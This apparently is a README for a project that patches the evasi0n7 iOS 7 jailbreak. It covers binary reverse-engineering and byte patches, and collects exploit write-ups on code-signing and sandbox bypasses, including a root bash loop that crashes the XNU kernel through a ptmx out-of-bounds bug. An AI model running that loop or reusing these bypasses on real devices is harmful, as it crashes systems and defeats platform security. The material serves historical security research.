# 7.0

Getting evasi0n7 (for jailbreaking iOS 7.0.x) to play nicely, or at least be able to work!

Please go to the repository [here](https://github.com/UInt2048/7.0) for the patched apps,
which you will find in the `execs` folder.

***

The macOS applications provided don't work on macOS 10.15+, just like the original, due to lack of 64-bit support, and there isn't anything I can do about that.

There are six executables provided. `.app` executables are for macOS, and `.exe` are for Windows.

*  `evasi0n7-14` are the original unpatched files.
*  `evasi0n7-16` are the patched files, re-patched to this repository.
*  `evasi0n7-20` are patched files, requiring a local server set up.

## Details
**evasi0n7** is a jailbreak program from the evad3rs. It performs an untethered jailbreak for all devices on iOS 7.0 through 7.1 beta 3, except the Apple TV. It was initially released on 22 December 2013, and became subject to controversy and criticism/backlash. On 28 December 2013, the Cydia package went live to saurik's repo.

## *Supported Devices*
The only unsupported devices are those of the Apple TV family. All other devices capable of running iOS 7 are supported.

### Apple TV's

* evasi0n7 is not capable of jailbreaking the Apple TV's. According to nitoTV, in his "Why isn't the Apple TV 3 jailbroken?" WWJC 2014 talk (<a href="https://www.youtube.com/watch?v=gaan3m8tt-c&t=15m35s&list=PLznXKK7IvpwdqQ6WZIS68yZymkGYYHNO4">video</a>), evasi0n7 would have been able to jailbreak the Apple TV (2nd generation) but was never updated to properly support it.

## Pre-patched versions

### evasi0n7-14

The original (not patched) evasi0n7 (version 1.0.7), which required a plist at http://evasi0n.com/apple-ipa-info.plist to exist (but that link is dead now). Useful for diff-checking, or just making sure the hashes are what they're supposed to be. Exactly the same as extracted from https://web.archive.org/web/20201017172130if_/https://evasiondownload.us/downloads/evasi0n7-win-1.0.7.zip and https://web.archive.org/web/20160627202955if_/http://evasiondownload.us/downloads/evasi0n7-mac-1.0.7.dmg (confirmed hashes against https://www.theiphonewiki.com/wiki/Evasi0n7)

### evasi0n7-16

Patched in 2016 by [Reddit user u/spockers](https://www.reddit.com/r/sauriksbeard/comments/62nknk/evasi0n7_fix_for_cannot_retrieve_package_from_the/). However, the patching URLs at http://sauriksbeard.com are now also dead! Consequently, the files have been posted here and re-patched to GitHub instead. This one requires the plist at https://uint2048.github.io/7.0/16.plist.

`WWDC16.ipa` was downloaded from: https://web.archive.org/web/20160130010626if_/http://sauriksbeard.com/WWDC.ipa

### evasi0n7-20

Patched in 2020 by yours truly with a plist authored by [Reddit user u/Whistler_V6T](https://www.reddit.com/r/LegacyJailbreak/comments/ifmlpx/tutorial_how_to_jailbreak_ios_70x_with_evasi0n7/)! If you're worried this URL business will happen again, now you don't need to! This patch changes the URL to http://localhost/evasi0n-ipa-info.plist (so you'll need to download `18.plist` and rename it, and `WWDC16.ipa` and rename it to `WWDC.ipa`).

You can use a Python one-liner such as `sudo python3 -m http.server 80` or a program such as WAMP or MAMP to set up a local server. There are undoubtedly numerous methods to do this, but setting up a local server is outside of the scope of this repository.


## Research and patching [^1]
### Mach-O
***
evasi0n7 is a single architecture (i386) unsigned binary. The app is self-contained, meaning it packages all of its resources into the Mach-O. Using <a href="http://www.newosxbook.com/files/jtool.tar">jtool</a> to inspect the Mach-O header of the binary shows that there is some added sections in the ```__DATA``` segment.
```
   bash$ jtool -l ./evasi0n\ 7.app/Contents/MacOS/evasi0n7
   ...
   LC 02: LC_SEGMENT            	Mem: 0x00170000-0x01d09000 __DATA
   	Mem: 0x00170000-0x00170008		__DATA.__dyld              
   	Mem: 0x00170008-0x00170060		__DATA.__nl_symbol_ptr     (Non-Lazy Symbol Ptrs)
   	Mem: 0x00170060-0x001703d4		__DATA.__la_symbol_ptr     (Lazy Symbol Ptrs)
   	Mem: 0x001703d4-0x001703d8		__DATA.__mod_init_func     (Module Init Function Ptrs)
   	Mem: 0x001703d8-0x001705d0		__DATA.__const             
   	Mem: 0x001705d0-0x00171c14		__DATA.__data              
   	Mem: 0x00171c14-0x00171c64		__DATA.__cfstring          
   	Mem: 0x00171c64-0x001a942d		__DATA.data_3              
   	Mem: 0x001a942d-0x0087b92c		__DATA.data_4              
   	Mem: 0x0087b92c-0x0087be18		__DATA.data_5              
   	Mem: 0x0087be18-0x0087c2f8		__DATA.data_6              
   	Mem: 0x0087c2f8-0x008fb944		__DATA.data_7              
   	Mem: 0x008fb944-0x008fba7f		__DATA.data_8              
   	Mem: 0x008fba7f-0x008fbeac		__DATA.data_9              
   	Mem: 0x008fbeac-0x0160f3a1		__DATA.data_10             
   	Mem: 0x0160f3a1-0x016101ac		__DATA.data_11             
   	Mem: 0x016101ac-0x01d083dd		__DATA.data_12            
   	Mem: 0x01d08400-0x01d084cc		__DATA.__common            (Zero Fill)
   	Mem: 0x01d084cc-0x01d0866c		__DATA.__bss               (Zero Fill)
   		
   ...
```

The Mach-O ABI describes the __DATA segment as:

```
The __DATA segment contains writable data. The static linker sets the virtual memory permissions of this segment to allow both reading and writing. Because it is writable, the __DATA segment of a framework or other shared library is logically copied for each process linking with the library. When memory pages such as those making up the __DATA segment are readable and writable, the kernel marks them copy-on-write; therefore when a process writes to one of these pages, that process receives its own private copy of the page.
```

This means additional sections can be added using compiler flags, and these will be treated as raw data and added to the header and binary contents. Specifically they were called data_3 through data_12, and this is where the payloads used for jailbreak process are stored. At runtime, the evasi0n app was loading these data segments into memory to prepare to use them when jailbreaking.

### Payload Extraction
The locations of the payloads have been identified, and they can be extracted and examined. To extract the payloads from the binary and dump the data into a file that can be examined:

```
   bash$ jtool -e __DATA.data_3 ./evasi0n\ 7.app/Contents/MacOS/evasi0n7
   Requested section found at Offset 1510500
   Extracting __DATA.data_3 at 1510500, 227273 (377c9) bytes into evasi0n7.__DATA.data_3
```

### Payload Format
Before examining the dumped payload files, some information can be gathered from other parts of the Mach-O binary. By dumping the symbol table from the binary, it is possible to see the names of functions used in the binary that are linked to in external libraries. Something that stands out in the evasi0n binary is the usage of the gzip library.

```
   bash$ dsymutil -s ./evasi0n\ 7.app/Contents/MacOS/evasi0n7
   ----------------------------------------------------------------------
   Symbol table for: './evasi0n 7.app/Contents/MacOS/evasi0n7' (i386)
   ----------------------------------------------------------------------
   Index    n_strx   n_type             n_sect n_desc n_value
   ======== -------- ------------------ ------ ------ ----------------
   ...
   [   164] 00000ab1 01 (     UNDF EXT) 00     0a00   0000000000000000 '_getcwd'
   [   165] 00000ab9 01 (     UNDF EXT) 00     0a00   0000000000000000 '_getsectdata'
```

"_getsectdata" Suggests it is used to get the data from a particular data section from the Mach-O header

```
   [   166] 00000ac6 01 (     UNDF EXT) 00     0100   0000000000000000 '_gzclose'
   [   167] 00000acf 01 (     UNDF EXT) 00     0100   0000000000000000 '_gzopen'
   [   168] 00000ad7 01 (     UNDF EXT) 00     0100   0000000000000000 '_gzread'
   [   169] 00000adf 01 (     UNDF EXT) 00     0100   0000000000000000 '_gzseek'
   [   170] 00000ae7 01 (     UNDF EXT) 00     0100   0000000000000000 '_inflate'
   [   171] 00000af0 01 (     UNDF EXT) 00     0100   0000000000000000 '_inflateEnd'
   [   172] 00000afc 01 (     UNDF EXT) 00     0100   0000000000000000 '_inflateInit2_'
   ...
```

From that, it can be deduced that the payloads that were extracted are compressed using gzip. This can be verified by running the command <code>file</code> on the extracted payloads.

```
   bash$ file ./evasi0n7.__DATA.data_3 
   evasi0n7.__DATA.data_3: gzip compressed data, from Unix, last modified: Sun Dec 22 05:54:11 2013
```

After decompressing the gzip file there is a new file, again test that with <code>file</code>.
```
   bash$ mv ./evasi0n7.__DATA.data_3 ./evasi0n7.__DATA.data_3.gz
   bash$ gunzip ./evasi0n7.__DATA.data_3.gz
   bash$ file ./evasi0n7.__DATA.data_3
   evasi0n7.__DATA.data_3: POSIX tar archive
```

Seems that the payloads were stored as simply ```.tar.gz``` files dumped directly into the Mach-O header of the binary.

```
   bash$ tar ztvf ./evasi0n7.__DATA.data_3 
   drwxr-xr-x  0 planetbeing staff       0 Dec 22 00:20 ./
   drwxr-xr-x  0 planetbeing staff       0 Dec 17 18:27 ./Applications/
   drwxr-xr-x  0 planetbeing staff       0 Dec 21 07:25 ./etc/
   drwxr-xr-x  0 planetbeing staff       0 Dec 18 18:34 ./private/
   drwxr-xr-x  0 planetbeing staff       0 Dec 18 18:57 ./usr/
   drwxr-xr-x  0 planetbeing staff       0 Dec 19 04:18 ./usr/bin/
   drwxr-xr-x  0 planetbeing staff       0 Oct 31 23:14 ./usr/libexec/
   drwxr-xr-x  0 planetbeing staff       0 Dec 18 19:11 ./usr/libexec/cydia/
   -rwxr-xr-x  0 planetbeing staff    3363 Dec 18 23:59 ./usr/libexec/cydia/firmware.sh
   -rwxr-xr-x  0 planetbeing staff     228 Dec 17 20:43 ./usr/libexec/cydia/free.sh
   -rwxr-xr-x  0 planetbeing staff  132848 Dec 18 18:57 ./usr/bin/gssc
   -rwxr-xr-x  0 planetbeing staff  200352 Dec 19 04:18 ./usr/bin/uicache
   drwxr-xr-x  0 planetbeing staff       0 Dec 18 18:34 ./private/var/
   drwxr-xr-x  0 planetbeing staff       0 Dec 18 18:34 ./private/var/lib/
   drwxr-xr-x  0 planetbeing staff       0 Dec 18 18:34 ./private/var/lib/dpkg/
   drwxr-xr-x  0 planetbeing staff       0 Dec 22 00:12 ./private/var/lib/dpkg/info/
   -rw-r--r--  0 planetbeing staff     393 Dec 18 18:40 ./private/var/lib/dpkg/info/com.evad3rs.evasi0n7.list
   -rwxr-xr-x  0 planetbeing staff     678 Dec 18 18:52 ./private/var/lib/dpkg/info/com.evad3rs.evasi0n7.prerm
   -rw-r--r--  0 planetbeing staff    5137 Dec 22 00:12 ./private/var/lib/dpkg/info/cydia.list
   drwxr-xr-x  0 planetbeing staff       0 Dec 21 23:31 ./Applications/Cydia.app/
   -rwxr-xr-x  0 planetbeing staff     211 Dec 21 22:52 ./Applications/Cydia.app/Cydia
   -rwsr-sr-x  0 planetbeing staff  131824 Dec 22 00:00 ./Applications/Cydia.app/CydiaWrapper
   -rwsr-sr-x  0 planetbeing staff  382608 Dec 17 20:50 ./Applications/Cydia.app/MobileCydia
   -rwxr-xr-x  0 planetbeing staff   66960 Dec 22 00:04 ./Applications/Cydia.app/udidfix.dylib
```

* __data3 contains Cydia.
* __data4 contains Cydia subsystems (/bin, /usr/bin) and their supported libraries (/usr/lib)
* __data5 contains a Mach-O universal binary (ARMv7/ARMv7s,ARMv8) which is installed in the root file system
* __data6 contains a dylib (likely game over.dyliib) which exports the same symbols as libmis.dylib (used by amfid for code signature verification), but overrides them to return true
* __data7 contains another Mach-O binary (ARMv7/ARMv8), likely evasi0n7, which is installed in the root filesystem during the jailbreak
* __data8 contains the plist (property list) file used by evasion to register as a launchDaemon
* __data9 contains a dylib which overrides the sandbox dylib (similar to __data6, but to enable evasion to avoid the sandbox)
* __data10 contained the TaiG app and subsystems (similar to Cydia) - removed in 1.01 due to negative backlash
* __data11 contains a binary plist of strings used by the evasion binary
* __data12 contains the Cydia repo list

### Network Access
Noteably, when attempting to run the evasi0n.app without an active or accessible network connection, it will display a prompt that says it requires a network connection to be used. This is very true, as it needs to download the WWDC app as part of the exploit. However the app doesn't exhibit any of the typical commands for network access via Cocoa or CF APIs. Examining the symbol table we do see that there are references to "send", "recv", and other C-socket calls, however they appear to be used exclusively for the unix socket to communicate directly with the iOS device.

Examining the list of libraries linked to the binary gives some insight to how it was checking for a network connection.

```
   bash$ otool -L ./evasi0n\ 7.app/Contents/MacOS/evasi0n7 
   ./evasi0n 7.app/Contents/MacOS/evasi0n7:
   	/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.5)
   	/usr/lib/libxml2.2.dylib (compatibility version 10.0.0, current version 10.9.0)
   	/usr/lib/libssl.0.9.8.dylib (compatibility version 0.9.8, current version 50.0.0)
   	/usr/lib/libcrypto.0.9.8.dylib (compatibility version 0.9.8, current version 50.0.0)
   	/usr/lib/libcurl.4.dylib (compatibility version 7.0.0, current version 8.0.0)
   	/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation (compatibility version 150.0.0, current version 855.11.0)
   	/usr/lib/libobjc.A.dylib (compatibility version 1.0.0, current version 228.0.0)
   	/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit (compatibility version 1.0.0, current version 275.0.0)
   	/System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa (compatibility version 1.0.0, current version 20.0.0)
   	/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 1197.1.1)
   	/usr/lib/libstdc++.6.dylib (compatibility version 7.0.0, current version 60.0.0)
   	/usr/lib/libgcc_s.1.dylib (compatibility version 1.0.0, current version 2577.0.0)
   	/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit (compatibility version 45.0.0, current version 1265.0.0)
   	/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation (compatibility version 300.0.0, current version 1056.0.0)
```

This stands out due to the compatibility version listed being higher than the version OS X 10.6.8, which was oldest version of OS X that evasi0n.app claimed to support. Checking the symbol table again evidence of how libcurl can be seen.

```
   bash$ dsymutil -s ./evasi0n\ 7.app/Contents/MacOS/evasi0n7 
   ----------------------------------------------------------------------
   Symbol table for: './evasi0n 7.app/Contents/MacOS/evasi0n7' (i386)
   ----------------------------------------------------------------------
   Index    n_strx   n_type             n_sect n_desc n_value
   ======== -------- ------------------ ------ ------ ----------------
   ...
   [   133] 00000938 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_easy_cleanup'
   [   134] 0000094b 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_easy_getinfo'
   [   135] 0000095e 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_easy_init'
   [   136] 0000096e 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_easy_perform'
   [   137] 00000981 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_easy_setopt'
   [   138] 00000993 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_easy_strerror'
   [   139] 000009a7 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_global_cleanup'
   [   140] 000009bc 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_global_init'
   [   141] 000009ce 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_slist_append'
   [   142] 000009e1 01 (     UNDF EXT) 00     0500   0000000000000000 '_curl_slist_free_all'
   ...
```

Digging into the code in the binary, it appears as these commands are used to do a check against the address http://evasi0n.com/ex.plistx. This appears to be a binary file that dictates the internal operation of the evasi0n7.app. Specifically it is known to be able to enable and disable ability to install the TaiG payloads.

* **Version**: 1.0.0 (evad3rs), 1.0.0 (TaiG)
* **OS**: MacOS, Windows
* **Offset**: 0xb0947, 0x2e5f8
* **Changes**: patching bytes ```7a 68``` (<q>zh</q>) to ```78 78``` (<q>xx</q>), replacing ```E8C30000008A00``` with ```9090909090B000```, and replacing ```9090909090B001``` with ```9090909090B000```
* **Result**: Check always fails

## Exploit Breakdowns (Village Pump)

### <a href="http://pastebin.com/mT2n7uyj">Write-up by Braden Thomas</a>

* WWDC.app is downloaded from app store and uploaded over AFC to ~/Media/Downloads
* An IPA containing WWDC.app is uploaded and installed using MobileInstall, but first, the Info.plist in the WWDC app in the IPA is changed so that CFBundleExecutable points to the untouched copy of the app in Downloads
* when MobileInstall installs the app, it signature checks the copy in Downloads, signature check passes and app is installed
* WWDC.app/WWDC is overwritten using AFC with a #! script to point to afcd the command line in #! will expose the entire / over afc port 8888
* a dylib (gameover) is uploaded which uses a CS bypass (vmsize 0) to neuter sandboxing in afcd using LINKEDIT section (afcd starts its sandbox at runtime using sandbox_init*)
* a LaunchServices bug is used to make that app load that library when it runs the device reboots and the user is instructed to run the app
when the app runs, afcd runs exposing /, and the sandbox is neutered, allowing access everywhere however, iOS 7 kernel still prevents remapping / as writable so it's still just readonly
* at this point, /var/mobile/Library/Logs/AppleSupport is symlinked to /dev/rdisk0s1 the device is rebooted, and something early in boot (i believe ReportCrash) will chown that path to mobile which chowns rdisk
* they have an HFS library that has an AFC backend, so they're able to virtually mount the entire system partition via AFC by seeking around on the rdisk using AFC commands. so using that, they modify the system partition the changes to the system partition are adding an executable which is signed with a self-signed cert at /evasi0n7 and a launchd plist to run it at boot
* they use the same CS bypass used before to modify libmis.dylib which is loaded by amfid (which checks code signatures) to neuter the amfi checks and always return true (i.e. to MISValidateSignature)
* so evasi0n will run fine, and at that point it does the kernel portion
* they also have to do this trick involving another codeless library containing this xpcd_cache blob to bypass a change in iOS 7 (or was it 6) where launchctl will only load plists from signed libraries

See followups at <a href="https://twitter.com/drspringfield">@drspringfield</a>.

### <a href="http://geohot.com/e7writeup.html">Write-up by geohot</a>

<a href="https://www.theiphonewiki.com/wiki/Geohot">geohot</a> presented an evasi0n7 writeup on his website <a href="http://geohot.com/e7writeup.html">here</a>.

### Write-up by p0sixninja

The vulnerability is an out of bounds array in the _state.pis_ioctl_list array by specifying an overly large minor device node number. By placing data in a known location past the array it's possible to hijack the tty structure and special read and write data from ioctl calls, and control function pointers to control execution.

The exploit is actually quite simple to trigger. I discovered this with a simple fuzzing script to test out every single device node. Here's a small sample script that should crash the latest maverick update. please run this as root.

```bash
   #!/bin/bash
   
   for i in `seq 1 255`; do
   	echo "Node $i";
   	mknod /dev/crash c 16 $i;
   	echo "Hello World" >/dev/crash;
   	rm -rf /dev/crash;
   done;
```

The problem is they lack the check to see if the minor number is higher than the number of spots allocated. The problem comes down to this, I'll try to comment code as I go through it...

```c
   FREE_BSDSTATIC int
   ptsd_open(dev_t dev, int flag, __unused int devtype, __unused proc_t p)
   {
   	struct tty *tp;
   	struct ptmx_ioctl *pti;
   	int error;
   
   	/*
   	 * The dev_t structure holds the bits extracted and used to offset
   	 * in an array
   	 */
   
   	// We'll check this function out first, check below
   	if ((pti = ptmx_get_ioctl(minor(dev), 0)) == NULL) {
   	        return (ENXIO);
   	}
   
   	// Here's where the crash happens
   	if (!(pti->pt_flags & PF_UNLOCKED)) {
   		return (EAGAIN);
   	}
   
   	// This is the pointer we want to control
   	tp = pti->pt_tty;
   	tty_lock(tp);
   
   	if ((tp->t_state & TS_ISOPEN) == 0) {
   		termioschars(&tp->t_termios);	/* Set up default chars */
   		tp->t_iflag = TTYDEF_IFLAG;
   		tp->t_oflag = TTYDEF_OFLAG;
   		tp->t_lflag = TTYDEF_LFLAG;
   		tp->t_cflag = TTYDEF_CFLAG;
   		tp->t_ispeed = tp->t_ospeed = TTYDEF_SPEED;
   		ttsetwater(tp);		/* would be done in xxparam() */
   	} else if (tp->t_state&TS_XCLUDE && suser(kauth_cred_get(), NULL)) {
   	        error = EBUSY;
   		goto out;
   	}
   	if (tp->t_oproc)			/* Ctrlr still around. */
   		(void)(*linesw[tp->t_line].l_modem)(tp, 1);
   	while ((tp->t_state & TS_CARR_ON) == 0) {
   		if (flag&FNONBLOCK)
   			break;
   		error = ttysleep(tp, TSA_CARR_ON(tp), TTIPRI | PCATCH,
   				 "ptsd_opn", 0);
   		if (error)
   			goto out;
   	}
   	error = (*linesw[tp->t_line].l_open)(dev, tp);
   	/* Successful open; mark as open by the slave */
   	pti->pt_flags |= PF_OPEN_S;
   	CLR(tp->t_state, TS_IOCTL_NOT_OK);
   	if (error == 0)
   		ptmx_wakeup(tp, FREAD|FWRITE);
   out:
   	tty_unlock(tp);
   	return (error);
   }
```

```c
   /*
    * Given a minor number, return the corresponding structure for that minor
    * number.  If there isn't one, and the create flag is specified, we create
    * one if possible.
    *
    * Parameters:	minor			Minor number of ptmx device
    *		open_flag		PF_OPEN_M	First open of master
    *					PF_OPEN_S	First open of slave
    *					0		Just want ioctl struct
    *
    * Returns:	NULL			Did not exist/could not create
    *		!NULL			structure corresponding minor number
    *
    * Locks:	tty_lock() on ptmx_ioctl->pt_tty NOT held on entry or exit.
    */
   static struct ptmx_ioctl *
   ptmx_get_ioctl(int minor, int open_flag)
   {
   	struct ptmx_ioctl *new_ptmx_ioctl;
   
   	// For normal open() syscalls this flag is never set
   	if (open_flag & PF_OPEN_M) {
   
   		/*
   		 * If we are about to allocate more memory, but we have
   		 * already hit the administrative limit, then fail the
   		 * operation.
   		 *
   		 * Note:	Subtract free from total when making this
   		 *		check to allow unit increments, rather than
   		 *		snapping to the nearest PTMX_GROW_VECTOR...
   		 */
   		if ((_state.pis_total - _state.pis_free) >= ptmx_max) {
   			return (NULL);
   		}
   
   		MALLOC(new_ptmx_ioctl, struct ptmx_ioctl *, sizeof(struct ptmx_ioctl), M_TTYS, M_WAITOK|M_ZERO);
   		if (new_ptmx_ioctl == NULL) {
   			return (NULL);
   		}
   
   		if ((new_ptmx_ioctl->pt_tty = ttymalloc()) == NULL) {
   			FREE(new_ptmx_ioctl, M_TTYS);
   			return (NULL);
   		}
   	
   		/*
   		 * Hold the DEVFS_LOCK() over this whole operation; devfs
   		 * itself does this over malloc/free as well, so this should
   		 * be safe to do.  We hold it longer than we want to, but
   		 * doing so avoids a reallocation race on the minor number.
   		 */
   		DEVFS_LOCK();
   		/* Need to allocate a larger vector? */
   		if (_state.pis_free == 0) {
   			struct ptmx_ioctl **new_pis_ioctl_list;
   			struct ptmx_ioctl **old_pis_ioctl_list = NULL;
   
   			/* Yes. */
   			MALLOC(new_pis_ioctl_list, struct ptmx_ioctl **, sizeof(struct ptmx_ioctl *) * (_state.pis_total + PTMX_GROW_VECTOR), M_TTYS, M_WAITOK|M_ZERO);
   			if (new_pis_ioctl_list == NULL) {
   				ttyfree(new_ptmx_ioctl->pt_tty);
   				DEVFS_UNLOCK();
   				FREE(new_ptmx_ioctl, M_TTYS);
   				return (NULL);
   			}
   
   			/* If this is not the first time, copy the old over */
   			bcopy(_state.pis_ioctl_list, new_pis_ioctl_list, sizeof(struct ptmx_ioctl *) * _state.pis_total);
   			old_pis_ioctl_list = _state.pis_ioctl_list;
   			_state.pis_ioctl_list = new_pis_ioctl_list;
   			_state.pis_free += PTMX_GROW_VECTOR;
   			_state.pis_total += PTMX_GROW_VECTOR;
   			if (old_pis_ioctl_list)
   				FREE(old_pis_ioctl_list, M_TTYS);
   		} 
   		
   		if (_state.pis_ioctl_list[minor] != NULL) {
   			ttyfree(new_ptmx_ioctl->pt_tty);
   			DEVFS_UNLOCK();
   			FREE(new_ptmx_ioctl, M_TTYS);
   
   			/* Special error value so we know to redrive the open, we've been raced */
   			return (struct ptmx_ioctl*)-1; 
   
   		}
   
   		/* Vector is large enough; grab a new ptmx_ioctl */
   
   		/* Now grab a free slot... */
   		_state.pis_ioctl_list[minor] = new_ptmx_ioctl;
   
   		/* reduce free count */
   		_state.pis_free--;
   
   		_state.pis_ioctl_list[minor]->pt_flags |= PF_OPEN_M;
   		DEVFS_UNLOCK();
   
   		/* Create the /dev/ttysXXX device {<major>,XXX} */
   		_state.pis_ioctl_list[minor]->pt_devhandle = devfs_make_node(
   				makedev(ptsd_major, minor),
   				DEVFS_CHAR, UID_ROOT, GID_TTY, 0620,
   				PTSD_TEMPLATE, minor);
   		if (_state.pis_ioctl_list[minor]->pt_devhandle == NULL) {
   			printf("devfs_make_node() call failed for ptmx_get_ioctl()!!!!\n");
   		}
   	} else if (open_flag & PF_OPEN_S) {
   		DEVFS_LOCK();
   		_state.pis_ioctl_list[minor]->pt_flags |= PF_OPEN_S;
   		DEVFS_UNLOCK();
   	}
   
   	// No else statement to catch errors just return the index to the array faithfully. 
   	return (_state.pis_ioctl_list[minor]);
   }
```

First notice the (open_flag & PF_OPEN_M), if this is not true a lot of code will be skipped. on the ptmx devices, this isn't set so all this is complete skipped and we can skip to the end of the the code since there is no all catching else clause to handle most connections. It just automatically returns this array indexed with a user controllable value. Crash but true, let's look more into this structure we can control if we create a large minor number.

```c
   static struct _ptmx_ioctl_state {
   	struct ptmx_ioctl	**pis_ioctl_list;	/* pointer vector */
   	int			pis_total;		/* total slots */
   	int			pis_free;		/* free slots */
   } _state;
```

This just contains a pointer vector of ptmx_ioctl structures, let's look at the structure which should be contained in the minor number offset.

```c
   /*
    * ptmx_ioctl is a pointer to a list of pointers to tty structures which is
    * grown, as necessary, copied, and replaced, but never shrunk.  The ioctl
    * structures themselves pointed to from this list come and go as needed.
    */
   struct ptmx_ioctl {
   	struct tty	*pt_tty;	/* pointer to ttymalloc()'ed data */
   	int		pt_flags;
   	struct selinfo	pt_selr;
   	struct selinfo	pt_selw;
   	u_char		pt_send;
   	u_char		pt_ucntl;
   	void		*pt_devhandle;	/* cloned slave device handle */
   };
```

The first pointer in this structure is a pointer to a tty structure. This structure is easily readable and writable using using user land APIS. It also includes some function pointers in there which can be triggered to gain

```c
   struct tty {
   	lck_mtx_t	t_lock;		/* Per tty lock */
   
   	struct	clist t_rawq;		/* Device raw input queue. */
   	long	t_rawcc;		/* Raw input queue statistics. */
   	struct	clist t_canq;		/* Device canonical queue. */
   	long	t_cancc;		/* Canonical queue statistics. */
   	struct	clist t_outq;		/* Device output queue. */
   	long	t_outcc;		/* Output queue statistics. */
   	int	t_line;			/* Interface to device drivers. */
   	dev_t	t_dev;			/* Device. */
   	int	t_state;		/* Device and driver (TS*) state. */
   	int	t_flags;		/* Tty flags. */
   	int     t_timeout;              /* Timeout for ttywait() */
   	struct	pgrp *t_pgrp;		/* Foreground process group. */
   	struct	session *t_session;	/* Enclosing session. */
   	struct	selinfo t_rsel;		/* Tty read/oob select. */
   	struct	selinfo t_wsel;		/* Tty write select. */
   	struct	termios t_termios;	/* Termios state. */
   	struct	winsize t_winsize;	/* Window size. */
   					/* Start output. */
   	void	(*t_oproc)(struct tty *);
   					/* Stop output. */
   	void	(*t_stop)(struct tty *, int);
   					/* Set hardware state. */
   	int	(*t_param)(struct tty *, struct termios *);
   	void	*t_sc;			/* XXX: net/if_sl.c:sl_softc. */
   	int	t_column;		/* Tty output column. */
   	int	t_rocount, t_rocol;	/* Tty. */
   	int	t_hiwat;		/* High water mark. */
   	int	t_lowat;		/* Low water mark. */
   	int	t_gen;			/* Generation number. */
   	void	*t_iokit;		/* IOKit management */
   	int	t_refcnt;		/* reference count */
   };
```

You can imagine all the power you could do if you can control all these structures carefully. That will be the difficulty when trying to exploit. You need to find a kernel zone past this array and allocate your data into it in a way you always know the offset. shouldn't be too hard.

Here's what the crash looks like once triggered.

```
   bash-3.2# for i in `seq 1 255`;do echo $i; mknod /dev/crash c 16 $i;echo "Hello" >/dev/crash;rm -rf /dev/crash;done
```

```
   gdb$ bt
   #0  0xffffff8024f35fbc in ptsd_open (dev=0x10000010, flag=0x402, devtype=0x2000, p=0xffffff803655a3f8) at /SourceCache/xnu_debug/xnu-2422.1.72/bsd/kern/tty_ptmx.c:571
   #1  0xffffff8024bdd93f in spec_open (ap=0xffffff8225cb3928) at /SourceCache/xnu_debug/xnu-2422.1.72/bsd/miscfs/specfs/spec_vnops.c:325
   #2  0xffffff8024bc43c9 in VNOP_OPEN (vp=0xffffff803809c110, mode=0x402, ctx=0xffffff8035bcdd08) at /SourceCache/xnu_debug/xnu-2422.1.72/bsd/vfs/kpi_vfs.c:3015
   #3  0xffffff8024bb4eab in vn_open_auth (ndp=0xffffff8225cb3b70, fmodep=0xffffff8225cb3adc, vap=0xffffff8225cb3d08) at /SourceCache/xnu_debug/xnu-2422.1.72/bsd/vfs/vfs_vnops.c:591
   #4  0xffffff8024b9d8db in open1 (ctx=0xffffff8035bcdd08, ndp=0xffffff8225cb3b70, uflags=0x601, vap=0xffffff8225cb3d08, fp_zalloc=0xffffff8024ecf0b0 <fileproc_alloc_init>, cra=0x0, retval=0xffffff8035bcdc18) at /SourceCache/xnu_debug/xnu-2422.1.72/bsd/vfs/vfs_syscalls.c:3067
   #5  0xffffff8024b9e684 in open_nocancel (p=0xffffff803655a3f8, uap=0xffffff8035c3a920, retval=0xffffff8035bcdc18) at /SourceCache/xnu_debug/xnu-2422.1.72/bsd/vfs/vfs_syscalls.c:3345
   #6  0xffffff8024b9e4fc in open (p=0xffffff803655a3f8, uap=0xffffff8035c3a920, retval=0xffffff8035bcdc18) at /SourceCache/xnu_debug/xnu-2422.1.72/bsd/vfs/vfs_syscalls.c:3326
   #7  0xffffff8024fa3828 in unix_syscall64 (state=0xffffff8035c3a910) at /SourceCache/xnu_debug/xnu-2422.1.72/bsd/dev/i386/systemcalls.c:370
   
   gdb$ i r
```

```nasm
   rax            0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
   rbx            0xffffff80367ea168	0xffffff80367ea168
   rcx            0xffffff8033ec8788	0xffffff8033ec8788
   rdx            0x10	0x10
   rsi            0x0	0x0
   rdi            0x10	0x10
   rbp            0xffffff8225cb3870	0xffffff8225cb3870
   rsp            0xffffff8225cb3840	0xffffff8225cb3840
   r8             0x402	0x402
   r9             0x1	0x1
   r10            0xffffff80327c6220	0xffffff80327c6220
   r11            0x0	0x0
   r12            0xffffff8225cb3fc0	0xffffff8225cb3fc0
   r13            0x7f9190c045b0	0x7f9190c045b0
   r14            0xffffffff	0xffffffff
   r15            0xffffff8035c3a910	0xffffff8035c3a910
   rip            0xffffff8024f35fbc	0xffffff8024f35fbc <ptsd_open+76>
   eflags         0x10282	0x10282
   cs             0x8	0x8
   ss             0x0	0x0
   ds             0x0	0x0
   es             0x0	0x0
   fs             0xdead0000	0xdead0000
   gs             0xdead0000	0xdead0000
```

it was trying to read in the value of _state.pis_ioctl_list[10].

```
   gdb$ print _state.pis_ioctl_list[10]
   $1 = (struct ptmx_ioctl *) 0xdeadbeefdeadbeef
```

```
   gdb$ print pti
   $2 = (struct ptmx_ioctl *) 0xdeadbeefdeadbeef
```

It crashes here before dereferenceing the tty structure at the beginning of the ptmx_ioctl structure. We must know it's an address, but we also leak a bit near the address if it is an address. We should also be able to retrieve the value of all these state variables it sets from variable bits wherever the pointer is at to see if it's the correct pointer or not.

```c
        if (!(pti->pt_flags & PF_UNLOCKED)) {
   			return (EAGAIN);
   		  }
   	
   		  tp = pti->pt_tty;
    		tty_lock(tp);
	
        if ((tp->t_state & TS_ISOPEN) == 0) {
